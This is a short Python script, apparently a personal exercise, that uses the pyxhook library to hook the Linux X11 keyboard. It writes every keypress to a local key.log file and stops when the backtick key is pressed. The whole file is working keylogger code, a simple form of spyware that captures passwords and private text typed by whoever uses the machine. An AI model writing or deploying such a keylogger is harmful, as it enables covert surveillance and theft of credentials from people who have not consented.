import pyxhook

logfile='/home/hritik/keylogger/key.log'
def OnkeyPress(event):
	f=open(logfile, 'a')
	f.write(event.Key)
	f.write('\n')
	if event.Ascii==96:
		f.close()
		new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnkeyPress
new_hook.HookKeyboard()
new_hook.start()